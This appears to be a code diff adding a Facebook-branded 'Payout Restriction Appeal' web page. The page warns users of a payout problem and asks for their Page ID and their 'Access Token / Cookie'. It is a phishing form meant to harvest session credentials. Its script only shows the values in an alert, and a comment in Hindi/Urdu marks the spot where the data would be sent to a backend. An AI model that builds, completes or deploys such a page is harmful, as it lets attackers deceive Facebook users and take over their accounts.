@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Payout Restriction Appeal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      padding: 40px 10px;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      max-width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      margin-bottom: 10px;
+      font-size: 20px;
+    }
+    p {
+      font-size: 14px;
+      color: #555;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #155ecb;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Request for Remove Payout Restriction</h2>
+    <p>We've detected an issue with your payout settings. Please provide the required details to restore access.</p>
+    
+    <input type="text" placeholder="Page ID" id="pageId" />
+    <input type="text" placeholder="Access Token / Cookie" id="access" />
+    
+    <button onclick="submitForm()">Submit</button>
+  </div>
+
+  <script>
+    function submitForm() {
+      const pageId = document.getElementById('pageId').value;
+      const access = document.getElementById('access').value;
+
+      if (!pageId || !access) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      // Yahan aap form ka data handle kar sakti hain (e.g. send to backend)
+      alert("Form submitted:\nPage ID: " + pageId + "\nAccess: " + access);
+    }
+  </script>
+</body>
+</html>
